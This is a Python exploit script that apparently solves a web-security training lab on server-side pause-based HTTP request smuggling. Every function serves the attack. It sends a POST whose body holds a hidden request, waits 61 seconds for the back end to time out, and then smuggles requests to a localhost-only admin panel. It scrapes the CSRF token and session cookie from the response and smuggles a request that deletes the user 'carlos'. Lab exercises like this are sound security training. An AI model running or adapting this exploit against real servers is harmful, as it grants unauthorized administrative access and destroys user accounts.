# Server-side pause-based request smuggling

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import socket
import ssl
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

TIMEOUT = 61

##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t\t%s' % csrf)
	return csrf

def build_request(url):
	request_content = 'GET /admin/ HTTP/1.1\r\n'
	request_content += f'Host: localhost\r\n\r\n'

	request_main = 'POST /resources HTTP/1.1\r\n'
	request_main += f'Host: {url}\r\n'
	request_main += 'Connection: keep-alive\r\n'
	request_main += f'Content-Length: {str(len(request_content))}\r\n'
	request_main += '\r\n'
	print("------------------------------------------------------")
	print(request_main)
	print(request_content)
	print("------------------------------------------------------")
	return request_main, request_content

def build_delete_request(url, csrf, session):
	request_body = f"csrf={csrf}&username=carlos"
	
	request_content = 'POST /admin/delete/ HTTP/1.1\r\n'
	request_content += 'Host: localhost\r\n'
	request_content += 'Content-Type: application/x-www-form-urlencoded\r\n'
	request_content += f'Content-Length: {str(len(request_body))}\r\n'
	request_content += '\r\n'
	request_content += request_body

	request_main = 'POST /resources HTTP/1.1\r\n'
	request_main += f'Host: {url}\r\n'
	request_main += 'Connection: keep-alive\r\n'
	request_main += f'Content-Length: {str(len(request_content))}\r\n'
	request_main += '\r\n'
	print("------------------------------------------------------")
	print(request_main)
	print(request_content)
	print("------------------------------------------------------")
	return request_main, request_content

def send_get_request(request_content, host, port):
	context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
	context.check_hostname = False
	context.verify_mode = ssl.CERT_NONE
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
		with context.wrap_socket(sock, server_hostname=host) as ssock:
			ssock.connect((host, port))
			ssock.sendall(request_content.encode())
			resp = ssock.recv(4096)
			return resp

def send_smuggling(request1_content, request2_content, host, port):
	response = b''
	context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
	context.check_hostname = False
	context.verify_mode = ssl.CERT_NONE
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
		with context.wrap_socket(sock, server_hostname=host) as ssock:
			ssock.connect((host, port))
			print(f'[+] Sending:\n{request1_content}')
			ssock.sendall(request1_content.encode())
			print(f'[+] Waiting {TIMEOUT} seconds...')
			time.sleep(TIMEOUT)
			print(f'[+] Sending:\n{request2_content}')
			ssock.sendall(request2_content.encode())
			print(ssock.recv(4096))
			get_req = f'GET / HTTP/1.1\r\nHost: localhost\r\n\r\n'
			print(f'[+] Sending:\n{get_req}')
			ssock.sendall(get_req.encode())
			resp = ssock.recv(4096)
			if resp:
				if 'Admin panel' in resp.decode():
					return resp.decode()

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Server-side pause-based request smuggling')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print('[+] Usage: %s <URL>' % sys.argv[0])
		sys.exit(-1)
	s = requests.Session()
	s.proxies = proxies
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying send HTTP Request Smuggling attack...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			subdomain = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			print('[+] Sending the splitted request to get the CSRF Token...')
			r1, r2 = build_request(subdomain)
			resp = send_smuggling(r1, r2, subdomain, port)
			time.sleep(2)
			if not resp:
				print('[-] The first sequence failed to retrieve the Admin panel <!>')
			else:
				csrf = get_csrf_token(resp)
				session = re.search('session=(.*); Secure', resp).group(1)
				print(f'[+] Found Session cookie:\t{session}')
				print('[+] Trying to delete Carlos user...')
				r1, r2 = build_delete_request(subdomain, csrf, session)
				resp = send_smuggling(r1, r2, subdomain, port)
				print(resp)

			time.sleep(2)
			r = s.get(url)
			print(r)
			if 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()
